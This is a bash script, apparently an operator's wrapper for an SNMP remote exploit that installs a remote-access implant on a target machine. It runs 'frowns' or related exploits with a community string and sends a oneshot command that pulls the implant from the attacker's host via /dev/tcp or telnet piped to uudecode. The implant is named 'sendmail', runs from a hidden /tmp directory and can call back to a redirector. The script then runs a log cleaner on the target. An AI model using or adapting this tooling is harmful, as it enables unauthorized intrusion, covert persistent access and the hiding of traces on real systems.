#!/bin/bash
PROG=`basename ${0}`
VER="1.3"
CALLBACKDELAY=0
[ "$TUNNELPORT" ] || TUNNELPORT=`cat /current/bin/.tunnelport`
[ "$TUNNELPORT" ] || TUNNELPORT=18787
COLOR_SUCCESS="\\033[1;32m"
COLOR_FAILURE="\\033[1;31m"
COLOR_WARNING="\\033[1;33m"
COLOR_NORMAL="\\033[0;39m"
COLOR_NOTE="\\033[0;34m"
COLOR_WHITE="\\033[4;97m"
SETCOLOR_SUCCESS="echo -en $COLOR_SUCCESS"
SETCOLOR_FAILURE="echo -en $COLOR_FAILURE"
SETCOLOR_WARNING="echo -en $COLOR_WARNING"
SETCOLOR_NORMAL="echo -en $COLOR_NORMAL"
SETCOLOR_NOTE="echo -en $COLOR_NOTE"
SETCOLOR_WHITE="echo -en $COLOR_WHITE"
note() {
    if [ "$1" = "-n" ] ; then
      N=$1
      shift
    fi
    echo -e $N "$COLOR_NOTE${*}$COLOR_NORMAL"
}
notered() {
    if [ "$1" = "-n" ] ; then
      N=$1
      shift
    fi
    echo -e $N "$COLOR_FAILURE${*}$COLOR_NORMAL"
}
tunnelcmd() {
    echo "${*}" | nc -w1 -u 127.0.0.1 $TUNNELPORT
}

usage ()
{
  [ "$1" = "exit" ] && EXIT=1 && shift
  if [ "$1" = "-h" ] ; then
    shift
    echo "
Usage: $PROG -i <rem_ip> [ options ]

-i IP     IP of target machine (NO DEFAULT)
-g opt    Change default GS option from ./$GS_OPTION to \"./opt\"
          (can be grins, frowns or sneer).
-C str    Change default community string from public to \"str\".
-l IP     IP of attack machine (Default: the first active IP found in
          this order: ppp0, ppp1, eth0 or eth1) 
-n #      rat upload port (Default: a random port)
-p #      Use port # for RAT listen/callback. (Default: random)
-s #      Change delay used for -c to # seconds (must appear before -c).
-c        Use NOPEN syntax to have RAT callback after a delay (Default
          delay: $CALLBACKDELAY seconds). Callback is to -l IP.
-k        Use ksh method instead of telnet/uu*code.
-z        Do NOT use uncomrpess at the either end
-r rat    name of rat on target (Default: sendmail)
-D dir    directory to work from/create on target (Default = /tmp/.scsi)
-P        Assume PATH=. will fail so use ./ratname
          target, and MUST NOT use uuencode on upload.
-a ARCH   String used to determine which architecture NOPEN server to
          upload from /current/up/morerats/ using this (note tail -1):
          \"ls -1 ./noserver* 2>/dev/null | grep -i ${ARCH} | tail -1\".
          If not provided or no match, /current/up/noserver is assumed.

examples: 
   $PROG -l 19.16.1.1 -i 10.0.3.1 -n 2222 -r nscd -D /tmp/.dir
   $PROG -i 10.0.3.1
   $PROG -i TARGET_IP -l REDIRECTOR_IP
"
    notered NOTE: The only REQUIRED ARGUMENT is now -i
    echo "
The best way to back out of $PROG once done (whether or not you get on
target) is to kill off the packrat window first with ^C then ^D.

$PROG Version $VER"
  fi
  if [ "$1" = "-v" ] ; then
    echo "$PROG version $VER"
      shift
  fi
  ERRSTR="${*}"
  if [ "$ERRSTR" ] ; then
    notered "\a${ERRSTR}"
  fi
  [ "$EXIT" ] && exit
}

if [ $# -lt 1 ] ; then
    usage exit -h
fi

# Some default values
GS_OPTION=frowns
COMMUNITY=public

doit() {
while getopts hl:n:r:D:zi:cs:p:Pva:E:A:g:C:k optvar ; do
  case "$optvar"
  in
    h|v) usage exit -$optvar ;;
    i) REMOTE_IP=${OPTARG}  ;;
    l) CALLBACKIP=${OPTARG}  ;;
    c) CALLBACK=" callback";;
    n) LOCAL_PORT=${OPTARG} ;;
    r) RAT_NAME=${OPTARG}  ;;
    D) DIR=${OPTARG} ;;
    p) NOPENPORT="$OPTARG";;
    s) CALLBACKDELAY="$OPTARG";;
    z) NOZIP=yes
       PACKARGS=" -z" ;;
    P) DOTSLASH="./";;
    k) USEKSH=yes
       # this is not working dammit 
       NOUU=yes;;
    # In -a, ignore it if ARCH already defined by autoattack
    a) [ "$ARCH" ] || ARCH="$OPTARG";;
    E)  RATENVS="$OPTARG";;
    A)  RATARGS="$OPTARG";;
    g)  GS_OPTION="$OPTARG"
        [ -x ./$GS_OPTION ] || usage exit Invalid -g: ./$GS_OPTION not executable
        ;;
    C)  COMMUNITY="$OPTARG";;
    *) usage exit Invalid option $! ;;
  esac
done

[ "${DIR}" ] || DIR="/tmp/.scsi"
#[ "${LOCAL_PORT}" ] ||  LOCAL_PORT=`mkrandom -n 2>/dev/null`

if [ ! "$CALLBACKIP" ] ; then
    if [ ! "`which grepip 2>/dev/null`" ] ; then
	usage exit "\aMust have \"grepip\" in path or provide -l IP on command line"
    fi
    for INT in ppp0 ppp1 eth0 eth1 ; do 
	ADDR=`ifconfig $INT 2>/dev/null | grepip | egrep -v "255|127\.0" | head -1`
        [ "$ADDR" ] && CALLBACKIP=$ADDR
        [ "$CALLBACKIP" ] && break
    done
    while [ ! "$CALLBACKIP" ] ; do
        echo -en "What is your local/redirector IP address? "
        [ "$CALLBACKIP" ] && echo -en "[$CALLBACKIP] "
        read ans
        [ "$ans" -a "${ans:0:1}" != "y" -a "${ans:0:1}" != "Y" ] && \
	    CALLBACKIP=$ans
        CALLBACKIP=`echo $CALLBACKIP | grepip`
	[ "$ans" ] && echo -e "\n\n\a$ans is not a valid IP. Try again.\n\n"
    done
    INT=" ($INT)"
    note "Using $CALLBACKIP$INT for -l local IP argument"
fi

if [ "`which grepip 2>/dev/null`" ] ; then
    # Check IP arguments if we can
    [ "$REMOTE_IP" ] && ORIGREMOTE_IP=" ($REMOTE_IP)"
    [ "$CALLBACKIP" ] && ORIGCALLBACKIP=" ($CALLBACKIP)"
    REMOTE_IP=`echo $REMOTE_IP | grepip`
    CALLBACKIP=`echo $CALLBACKIP | grepip`
fi

[ "$REMOTE_IP" ] || usage exit "-i argument$ORIGREMOTE_IP is missing or not an IP"
[ "$CALLBACKIP" ] || usage exit "-l argument$ORIGCALLBACKIP is missing or not an IP"
[ "$RAT_NAME" ] || RAT_NAME=sendmail
if [ ! "$NOPENPORT" ] ; then
  NOPENPORT=`mkrandom -n 2>/dev/null`
  if [ "$NOPENPORT" ] ; then
    note "Using random NOPEN$CALLBACK port $NOPENPORT"
  fi
fi
[ ! "$NOPENPORT" ] && usage exit "mkrandom not in path--needed to generate random port"
if [ "$ARCH" ] ; then
    NOSERVER=`ls -1 /current/up/morerats/noserver* 2>/dev/null | grep -i ${ARCH} | tail -1`
fi
[ "$NOSERVER" ] || NOSERVER=/current/up/noserver


ifconfig -a 2>&1 | grep $CALLBACKIP > /dev/null && ITSLOCAL=yes
if [ ! "$ITSLOCAL" ] ; then
    REDIRECTOR="/redirector"
    [ "$TARGETIP" ] && REDIRECTOR2=" $TARGETIP via $CALLBACKIP via "
fi
# Check to make sure tcp LISTEN is there
PORTS=`netstat -an | grep tcp.*LIST | cut -f 2 -d ":" | sort -rn | awk '{print $1}' |egrep -v "6000"`

note Local ports LISTENing: $PORTS
echo
which packrat >/dev/null 2>&1
NOPACKRAT=$?

if [ "$LOCAL_PORT" ] ; then
  for i in $PORTS -1 ; do
    [ "$i" = "$LOCAL_PORT" ] && break
  done
  if [  $i -lt 0 ] ; then
    if [ -e "$NOSERVER" -a "$NOPACKRAT" = "0" ] ; then
#      echo -ne "The file /current/up/noserver exists, and you have no LISTENer on port ${LOCAL_PORT}.
#Do you want me to start a packrat listener on $LOCAL_PORT in another window for you? [Y] "
#      read ans
      [ ! "$ans" -o "${ans:0:1}" = "y" -o "${ans:0:1}" = "Y" ] && \
	    PACKRAT_SCRIPME=yes
    else
	[ "$NOPACKRAT" = "0" ] || usage exit "${COLOR_FAILURE}No packrat in your path$COLOR_NORMAL"
	PACKRAT_SCRIPME=yes
#      [ -e /current/up/noserver ] || echo "${COLOR_FAILURE}Must have /current/up/noserver to use packrat$COLOR_NORMAL"
#      exit
    fi
  fi
else
#  for i in $PORTS -1 ; do
#    [ $i -lt 0 ] && break
#    echo -n "Is $i your localPort (for RAT upload)? [Y] "
#    read ans
#    [ "$ans" ] || break
#    [ "${ans:0:1}" = "y" -o "${ans:0:1}" = "Y" ] && break
#  done
#  [ $i -lt 0 ] || LOCAL_PORT=$i
  if [ ! "$LOCAL_PORT" ] ; then
    while [ 1 ] ; do
      LOCAL_PORT=`mkrandom -n 2>/dev/null`
      [ ! "$LOCAL_PORT" ] && usage exit "mkrandom not in path--needed to generate random rat upload port"
      ALREADYTHERE=`netstat -an | grep tcp.*LIST | grep ":$LOCAL_PORT "`
      [ "$ALREADYTHERE" ] || break
    done
    note "Using a random port ($LOCAL_PORT) for local RAT upload listener (packrat)"
    if [ -e "$NOSERVER" ] ; then
      if [ "$NOPACKRAT" = "0" ] ; then
	PACKRAT_SCRIPME=yes
      else
        [ "$NOPACKRAT" = "0" ] || usage exit "No packrat in your path$COLOR_NORMAL"
      fi
    else
      PACKRAT_SCRIPME=yes
# never mind--let packrat deal with no noserver being there
#      usage exit Put correct noserver into /current/up/noserver and try again
    fi
  fi
fi
if [ "${REMOTE_IP:0:3}" = "127" ] ; then
  REDIRECT=yes
  ifconfig -a | grep $CALLBACKIP > /dev/null && NOTGOOD=yes
  if [ "$NOTGOOD" ] ; then
    $SETCOLOR_FAILURE
    echo -e "ARE YOU SURE? It looks like you are redirecting (due to remote being $REMOTE_IP),
and yet you want the RAT callback to go to $CALLBACKIP, WHICH\a IS ONE OF YOUR LOCAL IPs???"
    sleep 1
    echo -en "\nHit ^C to abort or enter to continue DESPITE THIS PROBLEM!!\a"
    $SETCOLOR_NORMAL
    read blah
  fi
  DEFTARGET=`head /current/etc/opscript.txt 2>/dev/null | grepip 2>/dev/null | head -1`
  if [ "$TARGETIP" ] ; then
    DEFTARGET=$TARGETIP
  else
    [ ! "$ACTUALTARGET" ] && [ "$DEFTARGET" ] && ACTUALTARGET=$DEFTARGET
    echo -en "\nEnter Target IP after redirecting through $CALLBACKIP: "
    [ "$DEFTARGET" ] &&  echo -en "[$DEFTARGET] " 
    read ACTUALTARGET
  fi
 [ ! "$ACTUALTARGET" ] && [ "$DEFTARGET" ] && ACTUALTARGET=$DEFTARGET
  until [ `echo $ACTUALTARGET | grepip 2>/dev/null` ] ; do
    [ "$ACTUALTARGET" ] && echo Bad IP $ACTUALTARGET
    echo -en "\nEnter Target IP after redirecting through $CALLBACKIP: "
    [ "$DEFTARGET" ] &&  echo -en "[$DEFTARGET] " 
    read ACTUALTARGET
    [ ! "$ACTUALTARGET" ] && [ "$DEFTARGET" ] && ACTUALTARGET=$DEFTARGET
  done
fi
[ "$ACTUALTARGET" ] || ACTUALTARGET=$REMOTE_IP

if [ "$USEKSH" ] ; then
  # ksh mode requires no uuencode/uudecode
  PACKARGS="$PACKARGS -u"
fi
echo
note "########################################"
note "Using GS option ./$GS_OPTION"
[ "$REDIRECTOR" ] || notered "Calling directly back to this box"
note "Local$REDIRECTOR IP = ${CALLBACKIP}$INT"
[ "$CALLBACK" ] && note "Using NOPEN Callback to $CALLBACKIP:$NOPENPORT"
[ "$CALLBACK" ] && notered "     (after a DELAY of $CALLBACKDELAY seconds)"
[ "$NOSERVER" ] && note Uploading rat: $NOSERVER
[ "$CALLBACK" ] || note "Starting rat listener on port ${NOPENPORT}"
note "Remote IP =$REDIRECTOR2 ${REMOTE_IP}"
note "Rat uplaod port = ${LOCAL_PORT}"
note "Name of Rat = ${RAT_NAME}"
[ "$NOZIP" ] && note "Not using compress/uncompress"
[ "$NOZIP" ] || note "Using compress/uncompress"
note "Directory to create/use = ${DIR}"
[ "$USEKSH" ] && note "Using ksh method to upload rat to Solaris target"
[ "$USEKSH" ] || note "Using telnet/uudecode method to upload rat"
note "########################################"
echo

#if [ "$PACKRAT_SCRIPME" ] ; then
  EXPLOIT_SCRIPME="packrat$PACKARGS $RAT_NAME $NOSERVER $LOCAL_PORT"
  note "\nStarting local LISTENer to send noserver via port $LOCAL_PORT\n"
  export EXPLOIT_SCRIPME
  echo EXPLOIT_SCRIPME=\"$EXPLOIT_SCRIPME\"  scripme -t PACKRAT -F -X \"-bg slategrey -fg white -geometry 131x55-0+0\"
  EXPLOIT_SCRIPME="$EXPLOIT_SCRIPME" scripme -t PACKRAT -F -X "-bg slategrey -fg white -geometry 131x55-0+0"
#fi

if [ "$REDIRECT" ] ; then
  if [ "$CALLBACK" ] ; then
    note "\n\nYou will need two NOPEN windows on $CALLBACKIP\n"
  fi
  note Here are some pastables:
  PASTABLE=`grep -v "^#" /current/down/didthis 2>/dev/null | egrep "nstun|noclient"`
  PASTABLE="
cd /current/down
${PASTABLE}"
  note "${PASTABLE}"
#  echo "FIRST/-tunnel nopen window on $CALLBACKIP:"
#  SECOND="SECOND "
#  note "\n-tunnel\n\nu 161 $ACTUALTARGET\nr $LOCAL_PORT\nr $XPORT\n\ns\n"
  while [ 1 ] ; do
    OKTUNNEL=`netstat -an | grep "^udp.*0 0.0.0.0:$TUNNELPORT "`
    if [ ! "$OKTUNNEL" ] ; then
      notered "You must start a -tunnel in a NOPEN window on udp/$TUNNELPORT:\n"
      note "\n-tunnel $TUNNELPORT udp\n\n"
      notered -n "Hit return once the -tunnel is up"
      read input
    fi
    [ "$OKTUNNEL" ] && break
  done
  note "Sending tunnel commands to 127.0.0.1:$TUNNELPORT"
  tunnelcmd u 161 $ACTUALTARGET
  tunnelcmd r $LOCAL_PORT
  tunnelcmd s
  if [ ! "$CALLBACK" ] ; then
    $SETCOLOR_FAILURE
    echo -en "Hit ^C to abort or enter once NOPEN -tunnel and packrat windows are ready"
    $SETCOLOR_NORMAL
    read blah
  fi
fi

if [ "$CALLBACK" ] ; then
  if [ "$CALLBACKDELAY" -a $CALLBACKDELAY -gt 0 ] ; then
    RAT_PREARGS="S=$CALLBACKDELAY D=-c${CALLBACKIP}:${NOPENPORT}"
  else
    RAT_PREARGS="D=-c${CALLBACKIP}:${NOPENPORT}"
  fi
  $SETCOLOR_FAILURE
  echo -e "\aYou must establish a NOPEN listener on $CALLBACKIP:$NOPENPORT\n\n"
  if [ "$REDIRECT" ] ; then
    $SETCOLOR_NORMAL
    if [ "$ITSLOCAL" ] ; then
      echo "${SECOND}remote nopen window on $CALLBACKIP:"
      note "${PASTABLE}\n/current/bin/noclient -l $NOPENPORT\n\n"
    else
      echo "${SECOND}remote nopen window on $CALLBACKIP:"
      note "${PASTABLE}\n-nrtun $NOPENPORT\n\n"
    fi
    $SETCOLOR_FAILURE
    echo -en "Hit ^C to abort or enter once NOPEN windows are ready"
    $SETCOLOR_NORMAL
    read blah
  else
    echo "${SECOND}remote nopen window on $CALLBACKIP:"
    note "\ncd /current/down/\n/current/bin/noclient -l $NOPENPORT\n\n"
    $SETCOLOR_FAILURE
    echo -en "Hit ^C to abort or enter once NOPEN windows are ready"
    $SETCOLOR_NORMAL
    read blah
  fi
else
  RAT_PREARGS=" D=-l${NOPENPORT}"
  if [ "$REDIRECT" ] ; then
    POSTRUN="${PASTABLE}

-nstun $ACTUALTARGET ${NOPENPORT}"
  else
    POSTRUN="noclient ${ACTUALTARGET}:${NOPENPORT}"
  fi
fi

# Now check what we can
echo ""
while [ 1 ] ; do

  [ "$CALLBACK" ] || OKNRTUN=okeydokey
  [ "$REDIRECT" ] || OKUDP=okeydokey
  [ "$REDIRECT" ] && OKUDP=`netstat -an | grep "^udp.*0 0.0.0.0:161 "`
  [ "$CALLBACK" ] && OKNRTUN=`netstat -an | grep "^tcp.*:$NOPENPORT " | egrep "ESTAB|LISTEN"`
  OKPACKRAT=`netstat -an | grep "^tcp.*0.0.0.0:$LOCAL_PORT .*LISTEN"`

  [ "$OKUDP" ] || notered "No udp/161 seen locally in netstat"
  [ "$OKNRTUN" ] || notered "No -nrtun or noclient -l for callback seen locally on port $NOPENPORT in netstat"
  if [ ! "$OKPACKRAT" ] ; then
    if [ "$OKUDP" -a "$OKNRTUN" ] ; then
      notered "waiting for packrat to start on port $LOCAL_PORT"
    else
      notered "No packrat seen locally on port $LOCAL_PORT in netstat"
    fi
  fi
  [ "$OKUDP" ] && [ "$OKNRTUN" ] && [ "$OKPACKRAT" ] && break

  [ "$OKUDP" ] && [ "$OKNRTUN" ] && sleep 2 && continue
  unset NOUDP NONRTUN NOPACKRAT
  notered "\a\n\nCANNOT PROCEED"
  notered "\a\n\nFix this and either ^C or hit Enter to try again."
  read blah
done
unset NOUDP NONRTUN NOPACKRAT
unset UNCOMPRESS
if [ ! "$NOZIP" ] ; then
  UNCOMPRESS=".Z && uncompress -f ${RAT_NAME}.Z 2>&1 "
  UNCOMPRESS=".Z && uncompress -f ${RAT_NAME}.Z "
  # Lop off the initial ".Z" if using telnet
  [ "$USEKSH" ] || UNCOMPRESS=${UNCOMPRESS:2}
fi


if [ "$USEKSH" ] ; then
  ONESHOT="(cd /tmp;mkdir -p	$DIR;	cd	$DIR ;	cat < /dev/tcp/$CALLBACKIP/$LOCAL_PORT 2>/dev/null > ${RAT_NAME}${UNCOMPRESS} && chmod 777 $RAT_NAME && PATH=. $RATENVS ${RAT_PREARGS} ${DOTSLASH}$RAT_NAME $RATARGS;)&"
  ONESHOT="cd /tmp;mkdir -p	$DIR;	cd	$DIR ;	cat < /dev/tcp/$CALLBACKIP/$LOCAL_PORT  > ${RAT_NAME}${UNCOMPRESS} && chmod 777 $RAT_NAME && PATH=. $RATENVS ${RAT_PREARGS} ${DOTSLASH}$RAT_NAME $RATARGS;"
  SH="/bin/ksh -c"
else
  ONESHOT="(cd /tmp;mkdir -p	$DIR;	cd	$DIR ;	telnet $CALLBACKIP $LOCAL_PORT </dev/console 2>/dev/null |uudecode > /dev/null 2>&1 ${UNCOMPRESS} && chmod 777 $RAT_NAME && PATH=. $RATENVS ${RAT_PREARGS} ${DOTSLASH}$RAT_NAME $RATARGS;)&"
  SH="/sbin/sh -c"
fi
# this changes tabs to spaces, multi-spaces to single-spaces, then spaces to tabs
ONESHOT=`echo $ONESHOT | tr "\t" " " | sed "s/  */ /g" | tr " " "\t"`
#rm oneshot.scr.tmp
cat > oneshot.scr << EOF
$SH $ONESHOT
EOF

if [ "$REDIRECT" ] ; then
  TAKENOTE="$TAKENOTE
========================================================

c 1 2 3 4 5 6 7 8
q

"
fi
if [ "$CALLBACK" ] ; then
  NOCLIENTCALL="cd /current/down\n../bin/noclient ${ACTUALTARGET}:$NOPENPORT"
  [ "$REDIRECT" ] && NOCLIENTCALL="-nstun $ACTUALTARGET ${NOPENPORT}"
  TAKENOTE="$TAKENOTE
========================================================

You did a NOPEN callback. Be sure to test a call FORWARD if you get on.
Something like (${COLOR_FAILURE}each on the right box${COLOR_NORMAL}):

-listen $NOPENPORT

$NOCLIENTCALL
"
fi
if [ "$POSTRUN" ] ; then
  TAKENOTE="$TAKENOTE
========================================================

$POSTRUN
"
fi

if [ "$TAKENOTE" ] ; then
  TAKENOTE="
========================================================
========================================================
               NOTES/PASTABLES FOR LATER

$TAKENOTE
========================================================
========================================================
"
  note "\nStarting window showing NOTES_FOR_LATER: $TAKENOTE"
#  EXPLOIT_SCRIPME="echo -e \"$TAKENOTE\"" scripme -t NOTES_FOR_LATER -F -X" -geometry 83x45+1280+0"
  xterm  -title NOTES_FOR_LATER -geometry 58x45+1280+0 -hold -e echo -e "$TAKENOTE" &
fi

echo "oneshot script is as follows: "
echo "========"
cat oneshot.scr
echo "========"
echo ""

OOPS=`grep $RAT_NAME ../up/$RAT_NAME.*uu`
if [ ! "$OOPS" ]; then
  echo "FATAL ERROR: ../up/$RAT_NAME.*uu appears to contain file other than $RAT_NAME."
  echo "\`grep $RAT_NAME ../up/$RAT_NAME.*uu\`=\"$OOPS\""
  echo ""
  exit 1
fi 
OOPS=`wc -c oneshot.scr  |awk '{print $1}'`
if [ ! -f "oneshot.scr" -o -z ${OOPS} -o ${OOPS} -ge 254 -o ${OOPS} -le 0 ]; then
  echo "FATAL ERROR: oneshot.scr is either not there or too large"
  exit 1
fi 

echo -e "About to run:\n\n"
note "  ./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr ${COMMUNITY} \n\n"

notered -n "Hit return to continue"
read input

echo "now running:  "
echo "  ./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr ${COMMUNITY} "
./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr ${COMMUNITY}

if [ "$GS_OPTION" = "frowns" ] ; then
  $SETCOLOR_NOTE
  echo -e "\nOK, ./frowns has finished.\n"
  echo -e "\n$PROG is going to run cleaner for you now, unless you (A)bort...\n\n"
  $SETCOLOR_WARNING
  echo -e "./cleaner $REMOTE_IP ${COMMUNITY} snmpx\n\n"
  $SETCOLOR_NOTE
  echo -en "Press return to run cleaner as shown, or enter \"A\" to abort."
  $SETCOLOR_NORMAL
  read ans
  ABORT=`echo $ans | tr "a-z" "A-Z"`
  if [ "${ABORT:0:1}" = "A" ] ; then
    $SETCOLOR_FAILURE
    echo -e "\n\n\aWHAT!!  Ok, then. You need to clean up after your own mess.\n\n"
    $SETCOLOR_NORMAL
  else
    ./cleaner $REMOTE_IP ${COMMUNITY} snmpx
  fi
fi

} # End doit

ARGS="${*}"
if [ "$TARGETIP" ] ; then
    # This is called by autoattack so allow changes
    notered "Automatic mode has pre-set these arguments:\n$COLOR_NORMAL\n${*}\n"
    notered "\n\nJust hit return to keep these arguments, or input a new and complete argument\nstring to use instead:\n"
    read ans
    if [ "$ans" ] ; then
	ARGS="$ans"
    fi
fi

doit $ARGS

SOCKETS=`ps -eaf | grep -w socket | grep -v grep`
if [ "$SOCKETS" ] ; then
  echo -e "\n\nYou still have socket running locally:\n\n$SOCKETS\n\n"
fi

echo -e "$COLOR_NOTE\n\nThank you for playing$COLOR_NORMAL\n\n"

### echo "removing intermediate scripts"
### rm ./gr_upload.scr ./oneshot.scr ./gr_upload.uu 

echo
echo "Don't forget to look for stray telnets running on target."

echo -e "\n\nDone.\n\n"

if [ "$REDIRECT" ] ; then
  notered "\n\nYou MUST ${COLOR_NOTE}FIRST$COLOR_FAILURE ^C and then ^D in the netcat window started earlier to be able to exit this window.\n\n"
fi 